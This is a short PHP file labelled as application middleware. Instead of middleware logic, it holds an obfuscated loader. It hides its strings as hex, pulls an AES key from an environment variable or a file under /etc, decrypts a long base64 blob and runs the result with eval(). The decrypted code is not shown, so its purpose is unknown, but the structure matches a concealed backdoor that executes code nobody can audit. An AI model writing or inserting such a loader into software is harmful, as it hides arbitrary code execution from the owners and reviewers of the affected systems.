<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('94wZMTtZHPXF2ubSVQGRmQ==');

$c=base64_decode(

'PRNGirwQGa7DPA41wIWqOa1I+r6ZiRwgoeyDi+KW4jfXjayFM+GgGq7H65kM8lo1i0bkfgT/w6Fi' .
'kEMfRVKph7a0SBwvBhcpOm7dItfWF950MsjDw61v4qKxJrHAU5ukkodrp4tcjE68gwKM3UZSWOIJ' .
'MaKuWw+81EJ+W/kvyMpOmkr1WcUO9dr1OcGgJz6KrkxBfENuqBOh/GUWJl39rTrm6yx1OMk9ffVa' .
'gpOWpO7sleu1qRVc6kANlCid4xjpYFZd8b1oxRwmnXcJLdgYVTcelMGLMVg+vu0kqZpEazWYSMx7' .
'aT+/gybBrA3M52W86PLS+Q81gG72NFFT0uknO7hItKTGfHM+49zwadcbWA3XjBd7PjBUE4qJ2o3R' .
'Fy7HvJwfdmpewL8Rp6Jgh3zcqNlwA5Ptnsm+/hFNw5TPegg4TT8Q0RneH8hqxjdoAE21E9B0R9YB' .
'pPQqkS1PSfzi6bECGonNyZUIC/aLr35d2jUpSAtwWj7OU2lXpOVUWGDEGzbu0RezkrWc8ISzWQBZ' .
'V9MvlpiHm5tZ410gphMkMHZQRxVy6EadE7yxBvXeSQxUVMK6EBmGirQ9qMGkB705MBX+qGQDpcqZ' .
'8Q6eOKgP2tOBtYgZKnBCluZEiVi+DcoHPE8ByF6RpL5B8TAzhZ0LUmSjnaztArY1CwMyfzzK4IZM' .
'moubd4N9CM/lH38+fn3E7qxYHFBJe3hSNfyqvhyDbE1DrvyFZAwqGmXg7MdNlekXROKHcbzG0Cjs' .
'8xsZkPKistzqLJJ4XrUM2zUqFz8uF84LGdY0v3gxjnXYiri+1MIRifAWU1K5Kejcagg8gtONObRM' .
'Yv/SStosEbB/uxRyyT21n/ZzNDmZPphmgo7QcdjoX9ykRBFg/yKdom7wlEMVSd/dEQOSxC54G0Qn' .
'KIoB+dled8AhhfaZ1Zs6I+qJGPSXbWuW2dK+E2T1M6W05K+/zNgCamJGlOd7vboC4O+PHXLGWMJf' .
'yAXEjAxe3m9KNnIeFJBWHvogQwkvcRUvfcn5R/ePz1zvkkE8SWx7XOrLA0xf/cZn4om0zhKTrLFa' .
'Vqm5lJHtYnGnghr9OUsCogu+t8BLeZLsGQr0s8/udyq4uhW1SZ2t4tbS41T2QmjQJxCn1pTJYpFE' .
'EoelAq11CY/R3LNlXRARuf8bdgV9x1y1EzFx6HTmC6seNICaGu0MVYNzIAaR7E9aq3Ft3IgSsKeN' .
'yPGEwUa3WnzDatd3mdbt2JAOTT5MahL79mJV1p4kce1tLTx3rwN0C2x11bhATnYPIaYFlLlJfcNE' .
'PC7oWTx8IxHoxFYxSliUUjLm3oYxXwAawA/fKFPGbv4AipNFSw20VsMIgL7ctgC4TEbwnDqaogjS' .
'/cHd+V1iIFrDe+a96O09jLXhzeoj3WwXaVAyANcchs1+ZfIH3vexcjbjfkkYKOR9OEzftheGsnRW' .
'AQhgpYaxLPvFftVrur4I7OoI9zgHg2el9Os1L/dG8dxzslirv7+ja0feDMPkOXKP3kowBE+v8HtG' .
'IjAP0F5NuV4zyO+iqWifi1clPdL19HW0Mjqj9w=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

